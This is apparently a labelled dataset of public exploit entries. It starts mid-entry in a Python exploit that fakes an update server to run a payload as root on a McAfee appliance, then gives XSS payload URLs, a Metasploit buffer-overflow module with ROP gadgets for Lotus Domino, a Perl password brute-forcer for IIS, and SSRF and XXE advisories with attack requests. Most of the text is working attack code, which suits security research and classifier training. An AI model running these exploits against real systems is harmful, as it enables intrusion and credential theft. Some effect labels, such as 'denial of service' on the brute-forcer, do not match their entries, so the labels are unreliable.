""antineDirectory%3D%2Fquarantine+nailsd.profile.{1}.quarantineFromRemoteFS%3Dfalse+nailsd.profile.{1"" \     ""}.quarantinesPerChild%3D10000+nailsd.profile.{1}.scanChildren%3D2+nailsd.profile.{1}.scanMaxTmo%3D3"" \     ""00+nailsd.profile.{1}.scanNWFiles%3Dfalse+nailsd.profile.{1}.scanOnRead%3Dtrue+nailsd.profile.{1}.s"" \     ""canOnWrite%3Dtrue+nailsd.profile.{1}.scannerPath%3D{4}+nailsd.profile.{1}.scansPerChild"" \     ""%3D10000+nailsd.profile.{1}.slowScanChildren%3D0+nailsd.profile.{1}.filter.0.type%3Dexclude-path+na"" \     ""ilsd.profile.{1}.filter.0.path%3D%2Fproc+nailsd.profile.{1}.filter.0.subdir%3Dtrue+nailsd.profile.{"" \     ""1}.filter.1.type%3Dexclude-path+nailsd.profile.{1}.filter.1.path%3D%2Fquarantine+nailsd.profile.{1}"" \     "".filter.1.subdir%3Dtrue+nailsd.profile.{1}.filter.extensions.mode%3Dall+nailsd.profile.{1}.filter.e"" \     ""xtensions.type%3Dextension+nailsd.profile.{1}.action.Default.primary%3DClean+nailsd.profile.{1}.act"" \     ""ion.Default.secondary%3DQuarantine+nailsd.profile.{1}.action.App.primary%3DClean+nailsd.profile.{1}"" \     "".action.App.secondary%3DQuarantine+nailsd.profile.{1}.action.timeout%3DPass+nailsd.profile.{1}.acti"" \     ""on.error%3DBlock&mon%3A3=sconf+{1}+commit+{0}&mon%3A4=db+set+{0}+_table%3Dschedule++taskName%3D{2}+"" \     ""taskType%3DOn-Demand+taskInfo%3DprofileName%3D{1}%2Cpaths%3Dpath%3A%2Ftmp%3Bexclude%3Atrue+timetabl"" \     ""e%3Dtype%3Dunscheduled+progress%3D+status%3DIdle+&mon%3A5=task+nstart+{2}&mon%3A6=db+select+_asc%3D"" \     ""taskName+_table%3Dschedule+_show%3Di_taskId+_show%3DtaskName+_show%3DtaskResults+_show%3Dtimetable+"" \     ""_show%3DtaskType+_show%3DtaskInfo+_show%3Di_lastRun+_show%3D%24i_lastRun+_show%3Dstatus+_show%3Dpro"" \     ""gress+_show%3Di_nextRun+_show%3D%24i_nextRun+_show%3Di_duration+_show%3DtaskInfo++_limit%3D50+_offs"" \     ""et%3D0&info%3A6=multi%2Cshow&mon%3A7=db+select+_table%3Dschedule+_show%3Dcount%28*%29&info%3A7=mult"" \     ""i%2Cshow&mon%3A8=sconf+ODS+begin&info%3A8=multi%2Cshow%2Cdigest&mon%3A9=task+updatecrontab&info%3A9"" \     ""=multi%2Cshow&loc%3A10=conf+get+browser.resultsPerPage&info%3A10=multi%2Cshow&echo%3A11=1&info%3A11"" \     ""=pageNo&echo%3A12=&info%3A12=selectedTask"").format(commit_id, ODS_name, scan_name,payload_path, binary_path)      headers = {'Content-Type': 'application/x-www-form-urlencoded'}     r = requests.post(url, data=postdata, cookies=req_cookie, verify=False, headers=headers)     r.raise_for_status()      pprint(""Payload executed"", 1)  def start_update_server():      class RequestHandler(BaseHTTPRequestHandler):         def do_HEAD(s):             s.send_response(200)             s.send_header(""Content-type"", ""text/html"")             s.end_headers()          def do_GET(s):             if s.path == ""/catalog.z"":                 s.send_response(200)                 s.send_header(""Content-type"", ""text/html"")                 s.end_headers()                 s.wfile.write(bytes(payload, ""utf-8""))                  pprint(""Payload placed"", 1)                  payload_in_place.set()                  # Die after sending payload so we send an incomplete response                 raise KillServer              else: # Assume all other requests are for SiteStat - Always increasing version                 s.send_response(200)                 s.send_header(""Content-type"", ""text/xml"")                 s.end_headers()                 s.wfile.write(bytes((""""""<?xml version=""1.0"" encoding=""UTF-8""?>"""""" \                 """"""<SiteStatus Status=""Enabled"" CatalogVersion=""2%d"">"""""" \                 """""" </SiteStatus>"""""") % int(time.time()), ""utf-8""))      # Throwing KillServer will shutdown the server ungracefully     class KillServer(Exception):         def __str__(self):             return ""Kill Server (not an error)""      # ThreadingMixIn plus support for KillServer exceptions     class AbortableThreadingMixIn(ThreadingMixIn):         def process_request_thread(self, request, client_address):             try:                 self.finish_request(request, client_address)                 self.shutdown_request(request)             except KillServer:                 pprint(""Killing update server dirtily"")                 self.shutdown_request(request)                 self.shutdown() # Only if we want to shutdown             except:                 self.handle_error(request, client_address)                 self.shutdown_request(request)       class BackgroundHTTPSrv(AbortableThreadingMixIn, HTTPServer):         pass      pprint(""Launching update server"")      srv = BackgroundHTTPSrv((local_ip, update_server_port), RequestHandler)     threading.Thread(target=srv.serve_forever).start()      pprint(""Update server started"", 1)     return srv   #################################################################################### ####################################################################################  pprint(""Attacking %s"" % target_domain, 1)  # Crack the auth cookie cookie = crack_cookie() auth_cookie = {""nailsSessionId"": cookie}  # Start our update server locally srv = start_update_server()  # Force target to use our update server update_update_server(auth_cookie)  # Make target download an update from us download_update(auth_cookie)  # Block until the target downloads our payload, payload_in_place.wait()  # Shutdown our update server srv.shutdown()  # Execute /bin/sh -(?) catalog.z exec_catalogz(auth_cookie)",execute code as root,1
34497,"ViArt Helpdesk - 'reviews.php?category_id' Cross-Site Scripting source: https://www.securityfocus.com/bid/42543/info     ViArt Helpdesk is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.     An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.     httpwww.example.com/helpdesk-demo/reviews.php?category_id=1>""><ScRiPt %0D%0A>alert(414577246752)%3B</ScRiPt>",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
17151,"IBM Lotus Domino iCalendar - MAILTO Buffer Overflow (Metasploit) ## # $Id: domino_icalendar_organizer.rb 12236 2011-04-04 17:43:34Z sinn3r $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::Tcp  	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""IBM Lotus Domino iCalendar MAILTO Buffer Overflow"", 			'Description'    => %q{ 					This module exploits a vulnerability found in IBM Lotus Domino iCalendar.  By 				sending a long string of data as the ""ORGANIZER;mailto"" header, process ""nRouter.exe"" 				crashes due to a Cstrcpy() routine in nnotes.dll, which allows remote attackers to 				gain arbitrary code execution.  				Note: In order to trigger the vulnerable code path, a valid Domino mailbox account 				is needed. 			}, 			'License'        => MSF_LICENSE, 			'Version'        => ""$Revision: 12236 $"", 			'Author'         => 				[ 					'A. Plaskett',  #Initial discovery, poc 					'sinn3r',       #Metasploit 				], 			'References'     => 				[ 					[ 'CVE', '2010-3407' ], 					[ 'OSVDB', '68040' ], 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-177/' ], 					[ 'URL', 'http://labs.mwrinfosecurity.com/advisories/lotus_domino_ical_stack_buffer_overflow/' ], 					[ 'URL', 'http://www-01.ibm.com/support/docview.wss?rs=475&uid=swg21446515' ], 				], 			'Payload'        => 				{ 					'BadChars' => [*(0x00..0x08)].pack(""C*"") + [*(0x10..0x18)].pack(""C*"") + [*(0x1a..0x1f)].pack(""C*"") + ""\x2c"" + [*(0x80..0xff)].pack(""C*""), 					'EncoderType' => Msf::Encoder::Type::AlphanumMixed, 					'EncoderOptions' => {'BufferRegister'=>'ECX'}, 					'StackAdjustment' => -3500, 				}, 			'DefaultOptions' => 				{ 					'ExitFunction' => ""process"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 						'Lotus Domino 8.5 on Windows 2000 SP4', 						{ 							'Offset'    => 2374,           #Offset to EIP 							'Ret'       => 0x6030582B,     #JMP ECX 							'MaxBuffer' => 9010,           #Total buffer size 						} 					], 					[ 						'Lotus Domino 8.5 on Windows Server 2003 SP0', 						{ 							'Offset'    => 2374,           #Offset to EIP 							'Ret'       => 0x6030582B,     #JMP ECX (Domino\\nnotes.dll) 							'MaxBuffer' => 9010,           #Total buffer size 						} 					], 					[ 						'Lotus Domino 8.5 on Windows Server 2003 SP2', 						{ 							'Offset'    => 2374,           #Offset to EIP 							'Ret'       => 0x604C4222,     #ADD AL,0x5E ; RETN 							'EAX'       => 0x7C35287F,     #Initial CALL VirtualProtect addr to align (MSVCR71.dll) 							'EaxOffset' => 2342,           #Offset to EAX 							'RopOffset' => 24,             #Offset to ROP gadgets 							'MaxBuffer' => 9010,           #Total buffer size 						} 					], 				], 			'DisclosureDate' => ""Sep 14 2010"", 			'DefaultTarget'  => 2))  			register_options( 				[ 					Opt::RPORT(25), 					OptString.new('MAILFROM', [true, 'Valid Lotus Domino mailbox account', '']), 					OptString.new('MAILTO',   [true, 'Valid Lotus Domino mailbox account', '']), 				], self.class) 	end  	def check 		connect 		banner = sock.get_once(-1,5).chomp 		disconnect  		if banner =~ /Lotus Domino Release 8.5/ 			return Exploit::CheckCode::Vulnerable 		else 			return Exploit::CheckCode::Safe 		end 	end 	 	def exploit 		sploit = '' 		if target.name =~ /Windows 2000 SP4/  			sploit << rand_text_alpha(934) 			sploit << payload.encoded 			sploit << rand_text_alpha((target['Offset']-sploit.length)) 			sploit << [target.ret].pack('V') 			sploit << rand_text_alpha((target['MaxBuffer']-sploit.length))  		elsif target.name =~ /Server 2003 SP0/  			sploit << rand_text_alpha(930) 			sploit << payload.encoded 			sploit << rand_text_alpha((target['Offset']-sploit.length)) 			sploit << [target.ret].pack('V') 			sploit << rand_text_alpha((target['MaxBuffer']-sploit.length))  		elsif target.name =~ /Server 2003 SP2/  			#Borrow a ""CALL VirtualProtect()"" in Domino's MSVCR71.dll to bypass DEP 			#shellcode max = 1312 bytes 			rop_gadgets = 			[ 				#EAX should be aligned to CALL VirtualProtect at this point 				0x604F5728,  #MOV DWORD PTR DS:[ECX],EAX; RETN (nnotes.dll) 				#Set shellcode address 				0x6247282B,  #MOV EAX,ECX; RETN (nlsccstr.dll) 				0x62454F32,  #ADD AL,2B; RETN (nlsccstr.dll) 				0x603F7B38,  #ADD AL,31; RETN (nnotes.dll) 				0x624B7040,  #MOV DWORD PTR DS:[ECX+4],EAX; RETN (nnotes.dll) 				#Set RETN value 				0x60577B7A,  #XCHG EAX,EDX; RETN (nnotes.dll) 				0x62452E35,  #MOV EAX,ECX; RETN (nlsccstr.dll) 				0x60606F4E,  #ADD AL,5D; RETN (nlsccstr.dll) 				0x603E6260,  #DEC EAX; RETN (nnotes.dll) 				0x603E6260,  #DEC EAX; RETN (nnotes.dll) 				0x603E6260,  #DEC EAX; RETN (nnotes.dll) 				0x603E6260,  #DEC EAX; RETN (nnotes.dll) 				0x603E6260,  #DEC EAX; RETN (nnotes.dll) 				0x7C3A4C72,  #MOV DWORD PTR DS:[EAX],EDX; RETN (msvcp71.dll) 				0x6247282B,  #MOV EAX,ECX; RETN (nlsccstr.dll) 				0x60253B6D,  #XCHG EAX,EBP; RETN (nnotes.dll) 				#Set Size (0x413) 				0x605A4B30,  #MOV EAX,205; RETN (nnotes.dll) 				0x605A4B30,  #MOV EAX,205; RETN (nnotes.dll) 				0x60592A36,  #ADD EAX,107; RETN (nnotes.dll) 				0x603B4C27,  #ADD AL,2B; RETN (nnotes.dll) 				0x624B7044,  #MOV DWORD PTR DS:[ECX+8],EAX; RETN 				0x604C5225,  #XOR EAX, EAX; RETN 				#newProtect 				0x60386C3C,  #MOV AL,3B; RETN (nnotes.dll) 				0x624D4C27,  #INC EAX; RETN (nlsccstr.dll) 				0x624D4C27,  #INC EAX; RETN (nlsccstr.dll) 				0x624D4C27,  #INC EAX; RETN (nlsccstr.dll) 				0x624D4C27,  #INC EAX; RETN (nlsccstr.dll) 				0x624D4C27,  #INC EAX; RETN (nlsccstr.dll) 				0x624B7048,  #MOV DWORD PTR DS:[ECX+C],EAX; RETN 				#oldProtect 				0x602B7353,  #MOV EAX,ESI; POP ESI; RETN (nnotes.dll) 				0x41414141,  #ESI 				0x624B704C,  #MOV DWORD PTR DS:[ECX+10],EAX; RETN (nlsccstr.dll) 				#Call VirtualProtect 				0x6247282B,  #MOV EAX,ECX; RETN (nlsccstr.dll) 				0x60276256,  #XCHG EAX,ESP; RETN (nnotes.dll) 			].pack(""V*"")  			align  = ""\x51""      #PUSH ECX 			align << ""\x58""      #POP EAX 			align << ""\x34\x43""  #XOR AL,43 			align << ""\x40""      #INC EAX 			align << ""\x34\x65""  #XOR AL,65 			align << ""\x50""      #PUSH EAX 			align << ""\x59""      #POP ECX  			sploit << rand_text_alpha(1022) 			sploit << align 			sploit << payload.encoded 			sploit << rand_text_alpha((target['EaxOffset']-sploit.length)) 			sploit << [target['EAX']].pack('V') 			sploit << rand_text_alpha((target['Offset']-sploit.length)) 			sploit << [target.ret].pack('V') 			sploit << rand_text_alpha((target['RopOffset'])) 			sploit << rop_gadgets 			sploit << rand_text_alpha((target['MaxBuffer']-sploit.length))  		end  		fname   = rand_text_alpha(4) 		prod_id = rand_text_alpha_upper(5) + ""@"" + rand_text_alpha_upper(13) + ""@"" + rand_text_alpha_upper(24) 		uid     = rand_text_alpha_upper(15) 		summary = rand_text_alpha_upper(5) + ""@"" + rand_text_alpha_upper(11) 		status  = rand_text_alpha_upper(4)  		body  = ""Content-Type: text/calendar; method=COUNTER; charset=UTF-8\r\n"" 		body << ""#{fname}.txt\r\n"" 		body << ""MIME-Version: 1.0\r\n"" 		body << ""Content-Transfer-Encoding: 8bit\r\n"" 		body << ""BEGIN:VCALENDAR\r\n"" 		body << ""METHOD:COUNTER\r\n"" 		body << ""PRODID:-//#{prod_id}//\r\n"" 		body << ""VERSION:2.0\r\n"" 		body << ""BEGIN:VEVENT\r\n"" 		body << ""UID:#{uid}\r\n"" 		body << ""SEQ:2\r\n"" 		body << ""RRULE:aaaa\r\n"" 		body << ""ORGANIZER:mailto:H@#{sploit}.com\r\n"" 		body << ""ATTENDEE;:Mailto:#{datastore['MAILTO']}\r\n"" 		body << ""SUMMARY:#{summary}\r\n"" 		body << ""DTSTART:20091130T093000Z\r\n"" 		body << ""DTEND:20091130T093000Z\r\n"" 		body << ""DTSTAMP:20091130T083147Z\r\n"" 		body << ""LOCATION:Location\r\n"" 		body << ""STATUS:#{status}\r\n"" 		body << ""END:VEVENT\r\n"" 		body << ""END:VCALENDAR\r\n"" 		body << ""\r\n.\r\n""  		commands = 		{ 			:HELO => ""HELO localhost\r\n"", 			:FROM => ""MAIL FROM: <#{datastore['MAILFROM']}>\r\n"", 			:RCPT => ""RCPT TO: <#{datastore['MAILTO']}>\r\n"", 			:DATA => ""DATA\r\n"", 			:MESG => body, 			:QUIT => ""QUIT\r\n"", 		}  		print_status(""Trying target #{target.name}"")  		connect  		# Get SMTP Banner 		res = sock.get_once.chomp 		print_status(""Banner: #{res}"")  		# Check banner before trying the exploit 		if res !~ /Lotus Domino Release 8.5/ 			print_error(""Remote service does not seem to be Lotus Domino 8.5"") 			disconnect 			return 		end  		# Send HELO 		sock.put(commands[:HELO]) 		res = sock.get_once 		print_status(""Received: #{res.chomp}"")  		# Set MAIL FROM 		sock.put(commands[:FROM]) 		res = sock.get_once 		print_status(""Received: #{res.chomp}"")  		# Set RCPT 		sock.put(commands[:RCPT]) 		res = sock.get_once 		print_status(""Received: #{res.chomp}"")  		# Set DATA 		sock.put(commands[:DATA]) 		res = sock.get_once 		print_status(""Received: #{res.chomp}"")  		# Send malicious data 		sock.put(commands[:MESG]) 		res = sock.get_once  		# QUIT 		sock.put(commands[:QUIT]) 		res = sock.get_once 		print_status(""Received: #{res.chomp}"")  		handler 		disconnect 	end end   =begin 0:008> r eax=41414141 ebx=00000004 ecx=08da9700 edx=08dab695 esi=06c248bc edi=00000014 eip=42424242 esp=08da9cc0 ebp=41414141 iopl=0         nv up ei pl nz na pe nc cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010206 42424242 ??              ??? 0:008> !exchain 08daea2c: nRouter+511bb (004511bb) 08daffdc: kernel32!_except_handler3+0 (77e70abc)   CRT scope  0, filter: kernel32!BaseThreadStart+3a (77e4a92d)                 func:   kernel32!BaseThreadStart+4b (77e4a943) Invalid exception stack at ffffffff 0:008> k ChildEBP RetAddr   WARNING: Frame IP not in any known module. Following frames may be wrong. 08da9cbc 43434343 0x42424242 08da9cc0 43434343 0x43434343 ... 0:008> bl  0 e 602738f9     0001 (0001)  0:**** nnotes!MailCheck821Address+0xb09 0:008> u 602738f9 nnotes!MailCheck821Address+0xb09: 602738f9 e80239d9ff      call    nnotes!Cstrcpy (60007200) 602738fe eb02            jmp     nnotes!MailCheck821Address+0xb12 (60273902) 60273900 33ff            xor     edi,edi 60273902 8d8dc0faffff    lea     ecx,[ebp-540h] 60273908 51              push    ecx 60273909 8d95bcf6ffff    lea     edx,[ebp-944h] 6027390f 52              push    edx 60273910 e8eb38d9ff      call    nnotes!Cstrcpy (60007200)  Badchars: 0x01=0x0F21, 0x02=0x0f22,  0x03=0x0f23, 0x04=0x0f24, 0x05=0x0f25,  0x06=0x0f26, 0x07=0x0f27 0x08=0x0f28, 0x0a=nocrash, 0x0b=0x0f2b, 0x0c=0x0f2c, 0x0d=nocrash, 0x0e=0x0f2e  0x0f=0x0f2f, 0x10=0x0f30, 0x11=0x0f31,  0x12=0x0f32, 0x13=0x0f33, 0x14=0x0f34,  0x15=0x0f35, 0x16=0x0f36, 0x17=0x0f37, 0x18=0x0f38,  0x1a=0x0f3a, 0x1b=0x0f3b, 0x1c=0x0f3c,  0x1d=0x0f3d, 0x1e=0x0f3e, 0x1f=0x0f3f, 0x2c=nocrash, 0x80..0xff = """" =end",gain arbitrary code execution,1
30583,PHP-Stats 0.1.9.2 - 'Tracking.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/25674/info  Php-Stats is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  This issue affects Php-Stats 0.1.9.2; other versions may also be affected.  http://www.example.com/php-stats-path/tracking.php?what=online&ip=[XSS],execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
22562,"Microsoft IIS 5.0 - User Existence Disclosure (1) source: https://www.securityfocus.com/bid/7492/info  Microsoft IIS is prone to an issue where the existence of users may be revealed to remote attackers. The vulnerability exists when users attempt to authenticate against a vulnerable system.  IIS will generate an error page if authentication fails. Different messages are generated depending on whether the user exists or not.  ########################################################################## ################# # Miscrosoft IIS Authentication Manager BruteForce Tool - By JeiAr http://www.gulftech.org ########################################################################## ################# # This tool can be used to brute force user accounts via dictionary attack on the Microsoft # IIS Authentication Manager. More details here http://www.securityfocus.com/archive/1/8515 ########################################################################## #################  use LWP::UserAgent;  ########################################################################## ################# # Time to create the new LWP User Agent, Clear the screen, And print out the scripts header ########################################################################## #################  $ua = new LWP::UserAgent; $ua->agent(""AgentName/0.1 "" . $ua->agent); system('cls'); &header;  ########################################################################## ################# # Gather all user inputted data. Such as the domain name, host and location of the wordlist ########################################################################## #################   print ""Host: ""; $host=<STDIN>; chomp $host; print ""Domain: ""; $domain=<STDIN>; chomp $domain; print ""Account: ""; $account=<STDIN>; chomp $account; print ""Word List: ""; $list=<STDIN>; chomp $list;  ########################################################################## ################# # Opens the wordlist and puts the data into an array. afterward setting the count variables ########################################################################## #################  open (DATAFILE, ""$list""); @datafile = <DATAFILE>; chomp(@datafile); $length = @datafile; $count = 0; $found = 0;  &space; print ""Cracked Accounts\n""; print ""----------------\n"";  ########################################################################## ################# # Creates the HTTP request, Checks the responses, then prints out the username if it exists ########################################################################## #################  while ($count < $length) { $password = (@datafile[$count]); my $req = new HTTP::Request POST => ""http://$host/_AuthChangeUrl?"";    $req->content_type('application/x-www-form-urlencoded');    $req->content (""domain=$domain&acct=$account&old=$password&new=$password&new2=$password"" ); my $res = $ua->request($req); $pattern = ""Password successfully changed"";   $_ = $res->content; if (/$pattern/) { print ""$account : $password\n""; last if (/$pattern/);   }  $count++; }  ########################################################################## ################# # Thats all folks. Prints out the final details and footer. Rest is just the subroutines :) ########################################################################## #################  &space; &footer;  sub header { print ""IIS Auth Manager Brute Forcing Tool By JeiAr [http://www.gulftech.org] \n""; print ""------------------------------------------------------------------- --- \n""; }  sub footer { print ""Session Results:\n""; print ""--------------------\n""; print ""Number Of Words : $length \n""; print ""Number Of Tries : $count  \n""; }  sub space { print ""\n"" x2; }",denial of service,1
42439,"DALIM SOFTWARE ES Core 5.0 build 7184.1 - Server-Side Request Forgery DALIM SOFTWARE ES Core 5.0 build 7184.1 Server-Side Request Forgery   Vendor: Dalim Software GmbH Product web page: https://www.dalim.com Affected version: ES/ESPRiT 5.0 (build 7184.1)                                 (build 7163.2)                                 (build 7163.0)                                 (build 7135.0)                                 (build 7114.1)                                 (build 7114.0)                                 (build 7093.1)                                 (build 7093.0)                                 (build 7072.0)                                 (build 7051.3)                                 (build 7051.1)                                 (build 7030.0)                                 (build 7009.0)                                 (build 6347.0)                                 (build 6326.0)                                 (build 6305.1)                                 (build 6235.9)                                 (build 6172.1)                   ES/ESPRiT 4.5 (build 6326.0)                                 (build 6144.2)                                 (build 5180.2)                                 (build 5096.0)                                 (build 4314.3)                                 (build 4314.0)                                 (build 4146.4)                                 (build 3308.3)                   ES/ESPRiT 4.0 (build 4202.0)                                 (build 4132.1)                                 (build 2235.0)                   ES/ESPRiT 3.0  Summary: ES is the new Enterprise Solution from DALIM SOFTWARE built from the successful TWIST, DIALOGUE and MISTRAL product lines. The ES Core is the engine that can handle project tracking, JDF device workflow, dynamic user interface building, volume management. Each ES installation will have different features, depending on the license installed: online approval, prepress workflow, project tracking, imposition management...  ES is a collaborative digital asset production and management platform, offering services ranging from online approval to web-based production environment for all participants of the production cycle, including brand owners, agencies, publishers, pre-media, printers and multichannel service provider. ES lets users plan, execute and control any aspect of media production, regardless of the final use of the output (print, web, ebook, movie, and others). It ensures productivity and longterm profitability.   Desc: A server-side request forgery (SSRF) vulnerability exists in the DALIM Web Service management interface within the XUI servlet functionality. The DALIM web services are a set of tools used by the different DALIM SOFTWARE applications: TWIST, MISTRAL and ES. It provides file sharing capabilities, JDF devices, JDF controller, and job spooling management. The application parses user supplied data in the GET parameter 'screen' to construct a page request to the service. Since no validation is carried out on the parameter, an attacker can specify an external domain and force the application to make a HTTP request to an arbitrary destination host. This can be used by an external attacker for example to bypass firewalls and initiate a service and network enumeration on the internal network through the affected application.  Tested on: Red Hat Enterprise Linux Server release 7.3 (Maipo)            CentOS 7            Apache Tomcat/7.0.78            Apache Tomcat/7.0.67            Apache Tomcat/7.0.42            Apache Tomcat/6.0.35            Apache-Coyote/1.1            Java/1.7.0_80            Java/1.6.0_21   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2017-5428 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5428.php   15.06.2017  --   1. Check for open port: -----------------------  GET /dalimws/xui?screen=http://127.0.0.1:8888 HTTP/1.1 Host: 192.168.1.2:8080 Accept: */* Accept-Language: en Connection: close  <Error message=""java.net.ConnectException: Connection refused org.w3c.dom.DOMException: java.net.ConnectException: Connection refused&#10;&#9;at   2. Check for open port: -----------------------  GET /dalimws/xui?screen=http://127.0.0.1:8080 HTTP/1.1 Host: 192.168.1.2:8080 Accept: */* Accept-Language: en Connection: close  <Error message=""org.xml.sax.SAXParseException: The reference to entity ""ctype"" must end with the ';' delimiter. org.w3c.dom.DOMException: org.xml.sax.SAXParseException: The   3. Observe server-side request: -------------------------------  GET /dalimws/xui?screen=http://192.168.1.55 HTTP/1.1 Host: 192.168.1.2:8080 Accept-Language: en-US,en;q=0.8,mk;q=0.6 Connection: close   Request from 192.168.1.2 to 192.168.1.55 observed:  GET / HTTP/1.1 Cache-Control: no-cache Pragma: no-cache User-Agent: SSRF/Test_1.4 Host: 192.168.1.55 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive",force the application to make a HTTP request to an arbitrary destination host,1
47770,"Apache Olingo OData 4.0 - XML External Entity Injection ############################################################# # # COMPASS SECURITY ADVISORY # https://www.compass-security.com/research/advisories/ # ############################################################# # # Product:  Apache Olingo OData 4.0 # Vendor:   Apache Foundation # CSNC ID:  CSNC-2009-025 # CVE ID:   CVE-2019-17554 # Subject:  XML External Entity Resolution (XXE) # Risk:     High # Effect:   Remotely exploitable # Author:   Archibald Haddock (advisories@compass-security.com) # Date:     08.11.2019 # #############################################################  Introduction: ------------- Apache Olingo is a Java library that implements the Open Data Protocol (OData). [1] XML data is parsed by insecurley configured software components, which can be abused for XML External Entity Attacks [2].    Affected: --------- Vulnerable:  * Olingo OData 4.x.x to 4.6.x  Not vulnerable:  * Olingo OData 4.7.0  * The Olingo OData 2.0 implementation has XXE protection since 1.1.0-RC01  Technical Description --------------------- The XML content type entity deserializer is not configured to deny the resolution of external entities. Request with content type ""application/xml"", which trigger the deserialization of entities, can be used to trigger XXE attacks.  Request ====== POST /odata-server-sample/cars.svc/Cars HTTP/1.1 Host: localhost:8081 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: http://localhost:8081/odata-server-sample/ Cookie: JSESSIONID=17C3158153CDC2CA1DBA0E77D4AFC3B0 Upgrade-Insecure-Requests: 1 content-type: application/xml Content-Length: 1101  <?xml version=""1.0"" encoding=""UTF-8""?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]> <a:entry xmlns:a=""http://www.w3.org/2005/Atom"" xmlns:m=""http://docs.oasis-open.org/odata/ns/metadata"" xmlns:d=""http://docs.oasis-open.org/odata/ns/data"" m:context=""$metadata#Cars/$entity"">   <a:id>Cars(1)</a:id>   <a:title></a:title>   <a:summary></a:summary>   <a:updated>2019-11-08T15:10:30Z</a:updated>   <a:author>     <a:name></a:name>   </a:author>   <a:link rel=""edit"" href=""Cars(1)""></a:link>   <a:link rel=""http://docs.oasis-open.org/odata/ns/related/Manufacturer"" type=""application/atom+xml;type=feed"" title=""Manufacturer"" href=""Cars(1)/Manufacturer""></a:link>   <a:category scheme=""http://docs.oasis-open.org/odata/ns/scheme"" term=""#olingo.odata.sample.Car""></a:category>   <a:content type=""application/xml"">     <m:properties>       <d:Id m:type=""Int16"">1</d:Id>       <d:Model>F1 &xxe;</d:Model>       <d:ModelYear>2012</d:ModelYear>       <d:Price m:type=""Decimal"">189189.43</d:Price>       <d:Currency>EUR</d:Currency>     </m:properties>   </a:content> </a:entry>  Response ======== HTTP/1.1 201 Created Server: Apache-Coyote/1.1 OData-Version: 4.0 Content-Type: application/xml Content-Length: 960 Date: Fri, 08 Nov 2019 14:22:35 GMT Connection: close  <?xml version=""1.0"" encoding=""UTF-8""?><a:entry xmlns:a=""http://www.w3.org/2005/Atom"" xmlns:m=""http://docs.oasis-open.org/odata/ns/metadata"" xmlns:d=""http://docs.oasis-open.org/odata/ns/data"" m:context=""$metadata#Cars""><a:id>Cars(1)</a:id><a:title></a:title><a:summary></a:summary><a:updated>2019-11-08T15:22:35Z</a:updated><a:author><a:name></a:name></a:author><a:link rel=""edit"" href=""Cars(1)""></a:link><a:link rel=""http://docs.oasis-open.org/odata/ns/related/Manufacturer"" type=""application/atom+xml;type=feed"" title=""Manufacturer"" href=""Cars(1)/Manufacturer""></a:link><a:category scheme=""http://docs.oasis-open.org/odata/ns/scheme"" term=""#olingo.odata.sample.Car""></a:category><a:content type=""application/xml""><m:properties><d:Id m:type=""Int16"">1</d:Id><d:Model> myuser:x:1000:1000:,,,:/home/myuser:/bin/bash </d:Model><d:ModelYear>2012</d:ModelYear><d:Price m:type=""Decimal"">189189.43</d:Price><d:Currency>EUR</d:Currency></m:properties></a:content></a:entry>   Workaround / Fix: ----------------- Configure the XML reader securely [3].  In org.apache.olingo.server.core.deserializer.xml.ODataXmlDeserializer.java on line 70 a javax.xml.stream.XMLInputFactory is instanciated: private static final XMLInputFactory FACTORY = XMLInputFactory.newFactory();  The XMLInputFactory should be configured, not to resolve external entities: FACTORY.setProperty(XMLInputFactory.SUPPORT_DTD, false); FACTORY.setProperty(""javax.xml.stream.isSupportingExternalEntities"", false);   Timeline: --------- 2019-11-08:     Discovery by Compass Security 2019-11-08:     Initial vendor notification 2019-11-08:     Initial vendor response 2019-12-04:     Release of fixed Version / Patch [4] 2019-12-05:     Coordinated public disclosure date   [1] https://olingo.apache.org/ [2] https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing [3] https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html [4] https://mail-archives.apache.org/mod_mbox/olingo-user/201912.mbox/%3CCAGSZ4d7Ty%3DL-n_iAzT6vcQp65BY29XZDS5tMoM8MdDrb1moM7A%40mail.gmail.com%3E  Source: https://www.compass-security.com/fileadmin/Datein/Research/Advisories/CSNC-2019-025_apache_xxe.txt",code execution,1
